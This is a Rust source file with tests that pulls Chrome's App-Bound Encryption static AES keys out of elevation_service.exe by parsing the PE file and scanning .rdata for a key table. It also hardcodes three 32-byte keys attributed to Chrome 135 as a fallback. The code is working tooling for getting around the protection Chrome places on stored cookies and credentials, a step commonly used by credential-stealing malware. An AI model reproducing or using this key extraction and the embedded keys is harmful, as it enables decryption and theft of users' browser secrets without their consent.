//! Auto-extract Chrome ABE static AES keys from `elevation_service.exe`.
//!
//! The keys live in `.rdata` as a contiguous array of three 56-byte structs:
//!
//! ```text
//! struct ChromeAbeKeyEntry {
//!     u8  version;   // 1, 2, or 3 (strictly increasing across the table)
//!     u8  pad0[7];   // zero
//!     u32 meta1;     // small int
//!     u32 meta2;     // small int
//!     u8  aes_key[32];
//!     u8  pad1[8];   // zero, or a pointer/sentinel in newer builds
//! }
//! ```
//!
//! We scan `.rdata` for three consecutive entries with v=1,2,3 and high-entropy
//! key slots. On failure or missing binary, fall back to the hardcoded
//! Chrome 135.0.7049.115 keys.

/// Hardcoded Chrome 135.0.7049.115 static keys. Kept as the fallback when the
/// PE scan can't find a fresh table on the disk.
pub const CHROME_135_V1: [u8; 32] = [
    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66, 0x51,
    0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28, 0x47, 0x87,
];

pub const CHROME_135_V2: [u8; 32] = [
    0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80, 0x42,
    0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72, 0x96, 0x60,
];

pub const CHROME_135_V3: [u8; 32] = [
    0xCC, 0xF8, 0xA1, 0xCE, 0xC5, 0x66, 0x05, 0xB8, 0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06, 0x1C,
    0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC, 0xF5, 0x9B, 0xA4, 0xB7, 0x5C, 0x39, 0x23, 0x90,
];

/// Maps an ABE version byte to a 32-byte AES-256-GCM key.
#[derive(Debug, Clone, Default)]
pub struct BrowserKeyMap {
    /// (version, key) pairs.
    pub entries: Vec<(u8, [u8; 32])>,
    /// True when these are the hardcoded fallback (not from the user's binary).
    pub fallback: bool,
}

impl BrowserKeyMap {
    /// Look up the AES key for an ABE version byte.
    pub fn resolve(&self, version: u8) -> Option<[u8; 32]> {
        self.entries
            .iter()
            .find(|&&(v, _)| v == version)
            .map(|&(_, k)| k)
    }

    /// Returns true if no entries were found.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Parse the given `elevation_service.exe` bytes; fall back to Chrome 135
    /// hardcoded keys if the scan finds nothing.
    pub fn from_pe_or_fallback(pe: &[u8]) -> Self {
        if let Some(rdata) = locate_rdata(pe) {
            let hits = scan_for_key_table(rdata);
            if !hits.is_empty() {
                return Self {
                    entries: hits,
                    fallback: false,
                };
            }
        }
        Self::fallback()
    }

    /// Hardcoded Chrome 135.0.7049.115 keys.
    pub fn fallback() -> Self {
        Self {
            entries: vec![
                (1, CHROME_135_V1),
                (2, CHROME_135_V2),
                (3, CHROME_135_V3),
            ],
            fallback: true,
        }
    }

    /// Merge another map's entries in. Existing `(version, key)` slots are kept;
    /// the merged map's entries with the same version are dropped (first wins).
    /// Returns `true` if at least one entry was added.
    pub fn merge(&mut self, other: BrowserKeyMap) -> bool {
        let mut added = false;
        for (v, k) in other.entries {
            if !self.entries.iter().any(|&(ev, _)| ev == v) {
                self.entries.push((v, k));
                added = true;
            }
        }
        added
    }
}

// ---------------------------------------------------------------------------
// PE parser: locate the `.rdata` section.
// ---------------------------------------------------------------------------

fn locate_rdata(pe: &[u8]) -> Option<&[u8]> {
    if pe.len() < 0x40 || &pe[..2] != b"MZ" {
        return None;
    }
    let nt_off = u32::from_le_bytes(pe[0x3C..0x40].try_into().ok()?) as usize;
    if nt_off + 24 > pe.len() || &pe[nt_off..nt_off + 4] != b"PE\0\0" {
        return None;
    }
    let coff = nt_off + 4;
    let num_sections = u16::from_le_bytes(pe[coff + 2..coff + 4].try_into().ok()?) as usize;
    let opt_hdr_size = u16::from_le_bytes(pe[coff + 16..coff + 18].try_into().ok()?) as usize;
    let sections_off = coff + 20 + opt_hdr_size;
    for i in 0..num_sections {
        let s = sections_off + i * 40;
        if s + 40 > pe.len() {
            return None;
        }
        let name = &pe[s..s + 8];
        // First ".rdata" section wins; that's where the key table lives in Chrome.
        if name.starts_with(b".rdata") {
            let virt_size = u32::from_le_bytes(pe[s + 8..s + 12].try_into().ok()?) as usize;
            let raw_size = u32::from_le_bytes(pe[s + 16..s + 20].try_into().ok()?) as usize;
            let raw_off = u32::from_le_bytes(pe[s + 20..s + 24].try_into().ok()?) as usize;
            let len = raw_size.min(virt_size);
            if raw_off.saturating_add(len) > pe.len() {
                return None;
            }
            return Some(&pe[raw_off..raw_off + len]);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Pattern scanner.
// ---------------------------------------------------------------------------

const STRIDE: usize = 56;

/// Returns `(version, key)` pairs for each plausible 3-entry table in `rdata`.
fn scan_for_key_table(rdata: &[u8]) -> Vec<(u8, [u8; 32])> {
    let mut hits: Vec<(u8, [u8; 32])> = Vec::new();
    if rdata.len() < STRIDE * 3 {
        return hits;
    }
    let mut i = 0;
    while i + STRIDE * 3 <= rdata.len() {
        if let Some(entries) = try_table_at(&rdata[i..]) {
            for (v, k) in entries {
                if !hits.iter().any(|&(ev, _)| ev == v) {
                    hits.push((v, k));
                }
            }
            i += STRIDE * 3;
        } else {
            i += 8;
        }
    }
    hits
}

/// Try to interpret `buf[..168]` as three consecutive `ChromeAbeKeyEntry`.
fn try_table_at(buf: &[u8]) -> Option<Vec<(u8, [u8; 32])>> {
    if buf.len() < STRIDE * 3 {
        return None;
    }
    let mut out = Vec::with_capacity(3);
    for slot in 0..3 {
        let e = &buf[slot * STRIDE..(slot + 1) * STRIDE];
        let v = e[0];
        // Strictly increasing 1, 2, 3.
        if v as usize != slot + 1 {
            return None;
        }
        // 7 zero bytes after the version byte.
        if e[1..8].iter().any(|&b| b != 0) {
            return None;
        }
        // Two small u32 metadata values.
        let m1 = u32::from_le_bytes(e[8..12].try_into().unwrap());
        let m2 = u32::from_le_bytes(e[12..16].try_into().unwrap());
        if m1 > 32 || m2 > 32 {
            return None;
        }
        // Entropy gate on the 32 key bytes: distinct byte values >= 20.
        let key: [u8; 32] = e[16..48].try_into().unwrap();
        if distinct_bytes(&key) < 20 {
            return None;
        }
        // Trail bytes (e[48..56]) can be zero or a sentinel/pointer; don't gate on them.
        out.push((v, key));
    }
    Some(out)
}

fn distinct_bytes(buf: &[u8]) -> usize {
    let mut seen = [false; 256];
    let mut n = 0usize;
    for &b in buf {
        if !seen[b as usize] {
            seen[b as usize] = true;
            n += 1;
        }
    }
    n
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a 56-byte entry with the given version, meta values, key, and trail.
    fn make_entry(version: u8, m1: u32, m2: u32, key: &[u8; 32], trail: &[u8; 8]) -> Vec<u8> {
        let mut e = Vec::with_capacity(56);
        e.push(version);
        e.extend_from_slice(&[0u8; 7]);
        e.extend_from_slice(&m1.to_le_bytes());
        e.extend_from_slice(&m2.to_le_bytes());
        e.extend_from_slice(key);
        e.extend_from_slice(trail);
        e
    }

    /// Build a minimal valid PE/COFF + a single `.rdata` section whose raw bytes
    /// are `rdata_payload`. Returns the whole image bytes.
    fn build_pe_with_rdata(rdata_payload: &[u8]) -> Vec<u8> {
        let mut img = vec![0u8; 0x400];
        img[0] = b'M';
        img[1] = b'Z';
        // e_lfanew at 0x3C points to PE header.
        let nt_off: u32 = 0x80;
        img[0x3C..0x40].copy_from_slice(&nt_off.to_le_bytes());
        let nt = nt_off as usize;
        // PE\0\0 signature.
        img[nt..nt + 4].copy_from_slice(b"PE\0\0");
        // COFF: Machine (u16) + NumberOfSections (u16) + ... + SizeOfOptionalHeader (u16) @ +16.
        let coff = nt + 4;
        // NumberOfSections = 1
        img[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
        // SizeOfOptionalHeader = 0 (we keep it minimal; locate_rdata doesn't parse opt hdr).
        img[coff + 16..coff + 18].copy_from_slice(&0u16.to_le_bytes());
        // Section header starts at coff + 20.
        let sec = coff + 20;
        // Name ".rdata\0\0"
        img[sec..sec + 6].copy_from_slice(b".rdata");
        // VirtualSize = rdata len (offset 8).
        let vsize = rdata_payload.len() as u32;
        img[sec + 8..sec + 12].copy_from_slice(&vsize.to_le_bytes());
        // SizeOfRawData (offset 16).
        img[sec + 16..sec + 20].copy_from_slice(&vsize.to_le_bytes());
        // PointerToRawData (offset 20).
        let raw_off: u32 = 0x400;
        img[sec + 20..sec + 24].copy_from_slice(&raw_off.to_le_bytes());
        // Append rdata payload at file offset 0x400.
        img.extend_from_slice(rdata_payload);
        img
    }

    fn chrome_135_table_bytes() -> Vec<u8> {
        let mut t = Vec::with_capacity(STRIDE * 3);
        t.extend(make_entry(1, 1, 1, &CHROME_135_V1, &[0u8; 8]));
        t.extend(make_entry(2, 1, 3, &CHROME_135_V2, &[0u8; 8]));
        // Real Chrome 135 has a pointer in the v=3 trail; emulate that.
        t.extend(make_entry(
            3,
            0,
            1,
            &CHROME_135_V3,
            &[0x30, 0xc0, 0x1e, 0x40, 0x01, 0x00, 0x00, 0x00],
        ));
        t
    }

    #[test]
    fn parses_chrome_135_synthetic_pe() {
        let pe = build_pe_with_rdata(&chrome_135_table_bytes());
        let map = BrowserKeyMap::from_pe_or_fallback(&pe);
        assert!(!map.fallback, "should have extracted from PE, not fallback");
        assert_eq!(map.entries.len(), 3);
        assert_eq!(map.resolve(1), Some(CHROME_135_V1));
        assert_eq!(map.resolve(2), Some(CHROME_135_V2));
        assert_eq!(map.resolve(3), Some(CHROME_135_V3));
    }

    #[test]
    fn rejects_bogus_pe() {
        let map = BrowserKeyMap::from_pe_or_fallback(&[0u8; 64]);
        assert!(map.fallback);
        assert_eq!(map.entries.len(), 3);
    }

    #[test]
    fn rejects_pe_without_table() {
        // Valid PE shell but .rdata is junk (no key-shaped data).
        let mut junk = vec![0u8; 4096];
        for (i, b) in junk.iter_mut().enumerate() {
            *b = (i % 7) as u8;
        }
        let pe = build_pe_with_rdata(&junk);
        let map = BrowserKeyMap::from_pe_or_fallback(&pe);
        assert!(map.fallback);
    }

    #[test]
    fn pattern_scanner_finds_table_with_padding() {
        // Embed the table at a non-zero offset with junk before and after.
        let mut rdata = vec![0xAAu8; 256];
        rdata.extend_from_slice(&chrome_135_table_bytes());
        rdata.extend(vec![0x55u8; 256]);
        let pe = build_pe_with_rdata(&rdata);
        let map = BrowserKeyMap::from_pe_or_fallback(&pe);
        assert!(!map.fallback);
        assert_eq!(map.resolve(1), Some(CHROME_135_V1));
        assert_eq!(map.resolve(2), Some(CHROME_135_V2));
        assert_eq!(map.resolve(3), Some(CHROME_135_V3));
    }

    #[test]
    fn fallback_resolves_all_three_versions() {
        let map = BrowserKeyMap::fallback();
        assert_eq!(map.resolve(1), Some(CHROME_135_V1));
        assert_eq!(map.resolve(2), Some(CHROME_135_V2));
        assert_eq!(map.resolve(3), Some(CHROME_135_V3));
        assert_eq!(map.resolve(4), None);
    }

    #[test]
    fn merge_first_wins() {
        let mut a = BrowserKeyMap {
            entries: vec![(1, [0x11u8; 32])],
            fallback: false,
        };
        let b = BrowserKeyMap {
            entries: vec![(1, [0x22u8; 32]), (2, [0x33u8; 32])],
            fallback: false,
        };
        let added = a.merge(b);
        assert!(added);
        assert_eq!(a.resolve(1), Some([0x11u8; 32]));
        assert_eq!(a.resolve(2), Some([0x33u8; 32]));
    }
}
